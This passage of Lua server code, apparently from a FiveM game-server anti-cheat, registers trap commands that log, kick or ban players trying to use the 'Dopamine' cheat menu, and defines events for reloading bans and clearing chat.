 FIREACLog(source, "Anti Dopmain", "Try For Inject Dopamin Menu", FIREACS.AntiInjectKick, FIREACS.AntiInjectBan)
end)
RegisterCommand('incar', function (source, args)
 FIREACLog(source, "Anti Dopmain", "Try For Inject Dopamin Menu", FIREACS.AntiInjectKick, FIREACS.AntiInjectBan)
end)
RegisterCommand('panickey', function (source, args)
 FIREACLog(source, "Anti Dopmain", "Try For Inject Dopamin Menu", FIREACS.AntiInjectKick, FIREACS.AntiInjectBan)
end)

RegisterNetEvent('FIREAC:BanReloade')
AddEventHandler('FIREAC:BanReloade', function()
 FIREACBanReloade()
end)

RegisterNetEvent('FIREAC:ReloadChat')
AddEventHandler('FIREAC:ReloadChat', function()
 TriggerClientEvent("chat:clear", -1)
end)
